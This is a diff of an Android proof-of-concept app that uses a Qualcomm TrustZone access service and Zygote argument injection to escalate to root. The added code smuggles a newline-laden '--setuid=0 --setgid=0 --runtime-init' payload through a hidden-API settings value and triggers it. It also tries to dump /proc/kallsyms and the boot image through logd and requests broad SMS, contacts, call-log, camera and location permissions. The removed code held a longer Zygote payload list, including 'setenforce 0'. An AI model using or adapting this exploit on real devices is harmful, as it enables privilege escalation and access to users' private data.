@@ -1,9 +1,13 @@
 package com.example.tzpoc;
 
+import android.Manifest;
 import android.content.ComponentName;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.ServiceConnection;
+import android.content.pm.PackageManager;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
@@ -11,11 +15,15 @@ import android.os.IBinder;
 import android.os.Looper;
 import android.os.ParcelFileDescriptor;
 import android.os.RemoteException;
+import android.provider.Settings;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ScrollView;
 import android.widget.TextView;
+import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
@@ -37,6 +45,7 @@ public class MainActivity extends AppCompatActivity {
     private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
     private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
 
+    private static final int PERMISSION_REQUEST_CODE = 100;
     private TextView tvStatus, tvLog;
     private Button btnStart, btnStop;
     private Handler handler = new Handler(Looper.getMainLooper());
@@ -76,6 +85,10 @@ public class MainActivity extends AppCompatActivity {
         tvLog = findViewById(R.id.tv_log);
         btnStart = findViewById(R.id.btn_start);
         btnStop = findViewById(R.id.btn_stop);
+
+        // 権限リクエスト（通常のDangerous権限のみ）
+        requestNecessaryPermissions();
+
         btnStart.setOnClickListener(v -> {
             if (!isBound && !isTesting.get()) bindService();
         });
@@ -92,6 +105,56 @@ public class MainActivity extends AppCompatActivity {
             }
         });
         appendLog("App started. Press 'Start' to begin.");
+    }
+
+    private void requestNecessaryPermissions() {
+        List<String> needed = new ArrayList<>();
+        needed.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+        needed.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            needed.add(Manifest.permission.READ_MEDIA_IMAGES);
+            needed.add(Manifest.permission.READ_MEDIA_VIDEO);
+            needed.add(Manifest.permission.READ_MEDIA_AUDIO);
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            needed.add(Manifest.permission.POST_NOTIFICATIONS);
+        }
+        // その他の危険権限も必要に応じて追加
+        needed.add(Manifest.permission.ACCESS_FINE_LOCATION);
+        needed.add(Manifest.permission.ACCESS_COARSE_LOCATION);
+        needed.add(Manifest.permission.CAMERA);
+        needed.add(Manifest.permission.RECORD_AUDIO);
+        needed.add(Manifest.permission.READ_CONTACTS);
+        needed.add(Manifest.permission.WRITE_CONTACTS);
+        needed.add(Manifest.permission.READ_CALL_LOG);
+        needed.add(Manifest.permission.WRITE_CALL_LOG);
+        needed.add(Manifest.permission.READ_SMS);
+        needed.add(Manifest.permission.SEND_SMS);
+        needed.add(Manifest.permission.RECEIVE_SMS);
+
+        List<String> toRequest = new ArrayList<>();
+        for (String perm : needed) {
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                toRequest.add(perm);
+            }
+        }
+        if (!toRequest.isEmpty()) {
+            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            for (int i = 0; i < permissions.length; i++) {
+                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
+                    appendLog("Granted: " + permissions[i]);
+                } else {
+                    appendLog("Denied: " + permissions[i] + " - some features may be limited");
+                }
+            }
+        }
     }
 
     private void bindService() {
@@ -124,62 +187,186 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeFullTest() {
         isTesting.set(true);
-        appendLog("========== PHASE 1: Zygote Injection Tests ==========");
+        appendLog("========== CHECKING WRITE_SECURE_SETTINGS ==========");
+        boolean hasSecure = checkAndGuideSecureSettings();
 
-        // 1. Zygote への接続確認
-        String zygotePath = "/dev/socket/zygote";
-        boolean zygoteAvailable = tryConnect(zygotePath);
-        appendLog("Zygote available: " + zygoteAvailable);
-
-        if (zygoteAvailable) {
-            // 複数のペイロードで注入テスト
-            List<String> payloads = new ArrayList<>();
-            payloads.add("help");
-            payloads.add("status");
-            payloads.add("version");
-            payloads.add("getprop");
-            payloads.add("list");
-            payloads.add("dump");
-            payloads.add("logcat -d");
-            payloads.add("id");
-            payloads.add("setenforce 0");
-            payloads.add("dmesg");
-            payloads.add("exit");
-            payloads.add(""); // 空文字
-            payloads.add("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
-            payloads.add("1\n");
-            payloads.add("--setuid=0 --setgid=0");
-            payloads.add("--runtime-init");
-            payloads.add("--runtime-init --nice-name=exploit");
-            payloads.add("--setuid=0 --setgid=0 --runtime-init");
-            payloads.add("--setuid=0 --setgid=0 --nice-name=root_shell");
-            payloads.add("--setuid=1000 --setgid=1000");
-            payloads.add("--setuid=0 --setgid=0 --capabilities=0xffffffff");
-            payloads.add("--setuid=0 --setgid=0 --capabilities=0x3fffffffff");
-            payloads.add("--setuid=0 --setgid=0 --nice-name=system_server");
-            payloads.add("--setuid=0 --setgid=0 --runtime-init --nice-name=system_server");
-            payloads.add("--setuid=0 --setgid=0 --seinfo=platform");
-            payloads.add("--setuid=0 --setgid=0 --seinfo=platform --nice-name=system_server");
-            payloads.add("--setuid=1000 --setgid=1000 --seinfo=platform");
-            payloads.add("--setuid=0 --setgid=0 --seinfo=platform --nice-name=system_server --target-sdk-version=29");
-            payloads.add("--setuid=0 --setgid=0 --seinfo=platform --nice-name=system_server --target-sdk-version=29 --runtime-init");
-
-            interactWithZygote(zygotePath, payloads);
+        if (hasSecure) {
+            appendLog("WRITE_SECURE_SETTINGS is GRANTED! Proceeding with Zygote injection.");
+            attemptZygoteInjection();
+        } else {
+            appendLog("WRITE_SECURE_SETTINGS NOT granted. Skipping Zygote injection.");
         }
 
-        appendLog("========== PHASE 2: Logd & Property Service Dumps ==========");
-        // 2. logd と property_service から情報取得
-        dumpLogdAndProperties();
+        appendLog("========== DIRECT ZYGOTE SOCKET CONNECTION ==========");
+        attemptDirectZygoteConnection();
 
-        appendLog("========== PHASE 3: Attempt File Dumps (Indirect) ==========");
-        // 3. ファイルダンプ試行（間接的）
-        attemptFileDumps();
+        appendLog("========== DUMP FILES VIA LOGD ==========");
+        dumpFilesViaLogd();
 
-        appendLog("========== All tests completed ==========");
+        appendLog("========== ALL TESTS COMPLETED ==========");
         updateStatus("Done");
         isTesting.set(false);
         enableButtons(true, false);
         saveLog();
+    }
+
+    private boolean checkAndGuideSecureSettings() {
+        try {
+            ContentResolver cr = getContentResolver();
+            String test = Settings.Global.getString(cr, Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS);
+            appendLog("Settings readable (current value: " + (test != null ? test : "(null)") + ")");
+            // 書き込みテスト
+            String original = test;
+            Settings.Global.putString(cr, Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS, "test");
+            String newVal = Settings.Global.getString(cr, Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS);
+            if ("test".equals(newVal)) {
+                Settings.Global.putString(cr, Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS, original);
+                return true;
+            } else {
+                appendLog("Write test failed - WRITE_SECURE_SETTINGS not granted.");
+                showAdbGuideDialog();
+                return false;
+            }
+        } catch (SecurityException e) {
+            appendLog("SecurityException: " + e.getMessage());
+            showAdbGuideDialog();
+            return false;
+        } catch (Exception e) {
+            appendLog("Error: " + e.getMessage());
+            return false;
+        }
+    }
+
+    private void showAdbGuideDialog() {
+        handler.post(() -> {
+            new AlertDialog.Builder(this)
+                .setTitle("WRITE_SECURE_SETTINGS 権限が必要")
+                .setMessage("この権限はシステム権限のため、通常の許可ダイアログでは取得できません。\n\n" +
+                            "PC に接続し、以下の ADB コマンドを実行してください：\n\n" +
+                            "adb shell pm grant " + getPackageName() + 
+                            " android.permission.WRITE_SECURE_SETTINGS\n\n" +
+                            "実行後、アプリを再起動してください。")
+                .setPositiveButton("OK", null)
+                .show();
+        });
+    }
+
+    private void attemptZygoteInjection() {
+        appendLog("--- Zygote Injection via Settings ---");
+        try {
+            ContentResolver cr = getContentResolver();
+            // ペイロード生成 (Meta Red Team X 手法)
+            // 目標: Zygote に "--setuid=0 --setgid=0 --runtime-init" を実行させる
+            // 3 つの引数を持つコマンド: ["--setuid=0", "--setgid=0", "--runtime-init"]
+            // 加えて、システムサーバーが後に続くコマンドを無視するよう調整
+            StringBuilder payload = new StringBuilder();
+            // バッファサイズ調整用のパディング
+            int pad = 30;
+            for (int i = 0; i < pad; i++) {
+                payload.append("A");
+            }
+            // ここから本命: 3 はコマンドの引数個数
+            payload.append("3\n");
+            payload.append("--setuid=0\n");
+            payload.append("--setgid=0\n");
+            payload.append("--runtime-init\n");
+            // 遅延エントリ（カンマ区切りで追加）
+            payload.append(",,,X"); // これで 4 エントリになる
+
+            String malicious = payload.toString();
+            appendLog("Setting malicious value: " + malicious.replace("\n", "\\n"));
+            Settings.Global.putString(cr, Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS, malicious);
+
+            // トリガー: ポリシー設定をトグル
+            String oldPolicy = Settings.Global.getString(cr, Settings.Global.HIDDEN_API_POLICY);
+            Settings.Global.putString(cr, Settings.Global.HIDDEN_API_POLICY, "1");
+            Settings.Global.putString(cr, Settings.Global.HIDDEN_API_POLICY, oldPolicy != null ? oldPolicy : "");
+            appendLog("Triggered Zygote update. Check if a root process appeared.");
+
+            // 念のため、設定値を戻す（再起動後も保持されるので注意）
+            // ただし、ペイロードをそのまま残すと次回起動時に影響する可能性があるため、元に戻す
+            Settings.Global.putString(cr, Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS, "");
+            appendLog("Cleared setting to avoid persistence.");
+        } catch (Exception e) {
+            appendLog("Zygote injection error: " + e.getMessage());
+        }
+    }
+
+    private void attemptDirectZygoteConnection() {
+        String zygotePath = "/dev/socket/zygote";
+        appendLog("Trying direct connection to " + zygotePath);
+        if (mRemoteService == null) return;
+        ParcelFileDescriptor pfd = null;
+        try {
+            int[] iArr = new int[1];
+            pfd = mRemoteService.a(zygotePath, iArr);
+            if (pfd == null) {
+                appendLog("  Direct connection failed (null FD)");
+                return;
+            }
+            appendLog("  Got FD: " + iArr[0]);
+            java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
+            if (fdesc == null || !fdesc.valid()) {
+                appendLog("  FD invalid");
+                pfd.close();
+                return;
+            }
+            OutputStream os = new FileOutputStream(fdesc);
+            InputStream is = new FileInputStream(fdesc);
+            String testCmd = "1\n--help\n";
+            os.write(testCmd.getBytes(StandardCharsets.UTF_8));
+            os.flush();
+            String response = readWithTimeout(is, 500);
+            if (response != null && !response.isEmpty()) {
+                appendLog("  Zygote response: " + response);
+            } else {
+                appendLog("  No response (likely blocked by SELinux)");
+            }
+            pfd.close();
+        } catch (Exception e) {
+            appendLog("  Direct Zygote error: " + e.getMessage());
+            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
+        }
+    }
+
+    private void dumpFilesViaLogd() {
+        String logdPath = "/dev/socket/logd";
+        if (!tryConnect(logdPath)) {
+            appendLog("logd not available, skipping file dumps");
+            return;
+        }
+        String[] targets = {"/dev/bootimg", "/proc/kallsyms"};
+        for (String filePath : targets) {
+            if (stopRequested.get()) break;
+            appendLog("Dumping " + filePath + " via logd...");
+            ParcelFileDescriptor pfd = null;
+            try {
+                int[] iArr = new int[1];
+                pfd = mRemoteService.a(logdPath, iArr);
+                if (pfd == null) continue;
+                java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
+                if (fdesc == null || !fdesc.valid()) { pfd.close(); continue; }
+                OutputStream os = new FileOutputStream(fdesc);
+                InputStream is = new FileInputStream(fdesc);
+                String cmd = "cat " + filePath + "\n";
+                os.write(cmd.getBytes(StandardCharsets.UTF_8));
+                os.flush();
+                String resp = readWithTimeout(is, 2000);
+                if (resp != null && !resp.isEmpty() && !resp.contains("No such file") && !resp.contains("Permission denied")) {
+                    File out = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), new File(filePath).getName() + ".txt");
+                    try (FileOutputStream fos = new FileOutputStream(out)) {
+                        fos.write(resp.getBytes(StandardCharsets.UTF_8));
+                    }
+                    appendLog("  Saved to " + out.getAbsolutePath());
+                } else {
+                    appendLog("  No valid content.");
+                }
+                pfd.close();
+            } catch (Exception e) {
+                appendLog("  Error: " + e.getMessage());
+                if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
+            }
+        }
     }
 
     private boolean tryConnect(String path) {
@@ -195,234 +382,10 @@ public class MainActivity extends AppCompatActivity {
         return false;
     }
 
-    private void interactWithZygote(String path, List<String> payloads) {
-        appendLog("--- Testing Zygote Injection ---");
-        ParcelFileDescriptor pfd = null;
-        try {
-            int[] iArr = new int[1];
-            pfd = mRemoteService.a(path, iArr);
-            if (pfd == null) {
-                appendLog("  Re-connect to zygote failed");
-                return;
-            }
-            java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
-            if (fdesc == null || !fdesc.valid()) {
-                appendLog("  Zygote FD invalid");
-                pfd.close();
-                return;
-            }
-
-            OutputStream os = new FileOutputStream(fdesc);
-            InputStream is = new FileInputStream(fdesc);
-
-            for (String payload : payloads) {
-                if (stopRequested.get()) break;
-                appendLog("  Sending: " + (payload.isEmpty() ? "(empty)" : payload.replace("\n", "\\n")));
-                try {
-                    os.write((payload + "\n").getBytes(StandardCharsets.UTF_8));
-                    os.flush();
-                    String response = readWithTimeout(is, 500);
-                    if (response != null && !response.isEmpty()) {
-                        appendLog("  Response: " + response);
-                    } else {
-                        appendLog("  No response (timeout or empty)");
-                    }
-                } catch (Exception e) {
-                    String err = e.getMessage();
-                    appendLog("  Command failed: " + err);
-                    if (err != null && (err.contains("EPIPE") || err.contains("Broken pipe"))) {
-                        appendLog("  Socket closed, stopping zygote tests");
-                        break;
-                    }
-                }
-                try { Thread.sleep(100); } catch (InterruptedException ignored) {}
-            }
-            pfd.close();
-        } catch (Exception e) {
-            appendLog("  Zygote interaction exception: " + e.toString());
-            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
-        }
-    }
-
-    private void dumpLogdAndProperties() {
-        String logd = "/dev/socket/logd";
-        String prop = "/dev/socket/property_service";
-        ParcelFileDescriptor pfd = null;
-        try {
-            // logd
-            if (tryConnect(logd)) {
-                appendLog("--- Dumping logd ---");
-                int[] iArr = new int[1];
-                pfd = mRemoteService.a(logd, iArr);
-                if (pfd != null) {
-                    java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
-                    if (fdesc != null && fdesc.valid()) {
-                        OutputStream os = new FileOutputStream(fdesc);
-                        InputStream is = new FileInputStream(fdesc);
-                        List<String> cmds = new ArrayList<>();
-                        cmds.add("getLog");
-                        cmds.add("status");
-                        cmds.add("version");
-                        for (String cmd : cmds) {
-                            if (stopRequested.get()) break;
-                            appendLog("  logd: " + cmd);
-                            try {
-                                os.write((cmd + "\n").getBytes(StandardCharsets.UTF_8));
-                                os.flush();
-                                String resp = readWithTimeout(is, 500);
-                                if (resp != null && !resp.isEmpty()) {
-                                    appendLog("  logd response: " + resp);
-                                } else {
-                                    appendLog("  logd: no response");
-                                }
-                            } catch (Exception e) {
-                                appendLog("  logd command failed: " + e.getMessage());
-                                break;
-                            }
-                            try { Thread.sleep(100); } catch (InterruptedException ignored) {}
-                        }
-                        // さらに、logcat -d を試す（プロトコルが違うかもしれない）
-                        try {
-                            os.write("logcat -d\n".getBytes(StandardCharsets.UTF_8));
-                            os.flush();
-                            String resp = readWithTimeout(is, 1000);
-                            if (resp != null && !resp.isEmpty()) {
-                                appendLog("  logcat -d response: " + resp);
-                                // 保存
-                                File logFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "logcat_from_logd.txt");
-                                try (FileOutputStream fos = new FileOutputStream(logFile)) {
-                                    fos.write(resp.getBytes(StandardCharsets.UTF_8));
-                                }
-                                appendLog("  Log saved to " + logFile.getAbsolutePath());
-                            }
-                        } catch (Exception e) {
-                            appendLog("  logcat -d failed: " + e.getMessage());
-                        }
-                        pfd.close();
-                    }
-                }
-            }
-        } catch (Exception e) {
-            appendLog("logd dump error: " + e.toString());
-            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
-        }
-
-        // property_service
-        try {
-            if (tryConnect(prop)) {
-                appendLog("--- Dumping property_service ---");
-                int[] iArr2 = new int[1];
-                pfd = mRemoteService.a(prop, iArr2);
-                if (pfd != null) {
-                    java.io.FileDescriptor fdesc2 = pfd.getFileDescriptor();
-                    if (fdesc2 != null && fdesc2.valid()) {
-                        OutputStream os2 = new FileOutputStream(fdesc2);
-                        InputStream is2 = new FileInputStream(fdesc2);
-                        List<String> propCmds = new ArrayList<>();
-                        propCmds.add("getprop");
-                        propCmds.add("list");
-                        propCmds.add("status");
-                        propCmds.add("version");
-                        propCmds.add("getprop ro.build.version.sdk");
-                        propCmds.add("getprop ro.build.version.release");
-                        propCmds.add("getprop ro.product.model");
-                        propCmds.add("getprop ro.product.brand");
-                        propCmds.add("getprop ro.product.device");
-                        for (String cmd : propCmds) {
-                            if (stopRequested.get()) break;
-                            appendLog("  prop: " + cmd);
-                            try {
-                                os2.write((cmd + "\n").getBytes(StandardCharsets.UTF_8));
-                                os2.flush();
-                                String resp = readWithTimeout(is2, 500);
-                                if (resp != null && !resp.isEmpty()) {
-                                    appendLog("  prop response: " + resp);
-                                } else {
-                                    appendLog("  prop: no response");
-                                }
-                            } catch (Exception e) {
-                                appendLog("  prop command failed: " + e.getMessage());
-                                break;
-                            }
-                            try { Thread.sleep(100); } catch (InterruptedException ignored) {}
-                        }
-                        // 全体のプロパティリストを取得試行（もし list で取れたら保存）
-                        try {
-                            os2.write("list\n".getBytes(StandardCharsets.UTF_8));
-                            os2.flush();
-                            String resp = readWithTimeout(is2, 1000);
-                            if (resp != null && !resp.isEmpty()) {
-                                File propFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "properties.txt");
-                                try (FileOutputStream fos = new FileOutputStream(propFile)) {
-                                    fos.write(resp.getBytes(StandardCharsets.UTF_8));
-                                }
-                                appendLog("  Properties saved to " + propFile.getAbsolutePath());
-                            }
-                        } catch (Exception e) {
-                            appendLog("  property list failed: " + e.getMessage());
-                        }
-                        pfd.close();
-                    }
-                }
-            }
-        } catch (Exception e) {
-            appendLog("property_service dump error: " + e.toString());
-            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
-        }
-    }
-
-    private void attemptFileDumps() {
-        appendLog("--- Attempting to read /dev/bootimg and /proc/kallsyms via socket ---");
-        String[] targets = {"/dev/bootimg", "/proc/kallsyms"};
-        for (String filePath : targets) {
-            appendLog("  Trying to read " + filePath);
-            boolean done = false;
-            // まず、各ソケットにコマンドとして送信してみる
-            String[] socketsToTry = {"/dev/socket/logd", "/dev/socket/property_service", "/dev/socket/dnsproxyd"};
-            for (String sock : socketsToTry) {
-                if (done || stopRequested.get()) break;
-                if (!tryConnect(sock)) continue;
-                ParcelFileDescriptor pfd = null;
-                try {
-                    int[] iArr = new int[1];
-                    pfd = mRemoteService.a(sock, iArr);
-                    if (pfd == null) continue;
-                    java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
-                    if (fdesc == null || !fdesc.valid()) { pfd.close(); continue; }
-                    OutputStream os = new FileOutputStream(fdesc);
-                    InputStream is = new FileInputStream(fdesc);
-                    String cmd = "cat " + filePath + "\n";
-                    appendLog("    Sending via " + sock + ": cat " + filePath);
-                    os.write(cmd.getBytes(StandardCharsets.UTF_8));
-                    os.flush();
-                    String resp = readWithTimeout(is, 2000);
-                    if (resp != null && !resp.isEmpty() && !resp.contains("No such file") && !resp.contains("Permission denied")) {
-                        appendLog("    Got response, saving...");
-                        File outFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), new File(filePath).getName() + ".txt");
-                        try (FileOutputStream fos = new FileOutputStream(outFile)) {
-                            fos.write(resp.getBytes(StandardCharsets.UTF_8));
-                        }
-                        appendLog("    Saved to " + outFile.getAbsolutePath());
-                        done = true;
-                    } else {
-                        appendLog("    No valid response (or permission denied)");
-                    }
-                    pfd.close();
-                } catch (Exception e) {
-                    appendLog("    Error on " + sock + ": " + e.getMessage());
-                    if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
-                }
-            }
-            if (!done) {
-                appendLog("  Failed to retrieve " + filePath + " via any socket.");
-            }
-        }
-    }
-
     private String readWithTimeout(InputStream is, int timeoutMs) {
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         long start = System.currentTimeMillis();
-        byte[] buffer = new byte[512];
+        byte[] buffer = new byte[4096];
         try {
             while (System.currentTimeMillis() - start < timeoutMs) {
                 if (is.available() > 0) {
@@ -466,9 +429,9 @@ public class MainActivity extends AppCompatActivity {
                 appendLog("Cannot create Download dir");
                 return;
             }
-            File file = new File(dir, "deep_socket_poc_log.txt");
+            File file = new File(dir, "final_poc_log.txt");
             try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
-                pw.println("=== TZAccess Deep Socket PoC Log ===");
+                pw.println("=== TZAccess Final PoC Log ===");
                 pw.println("Timestamp: " + new Date().toString());
                 pw.println("===================================");
                 pw.print(logBuilder.toString());
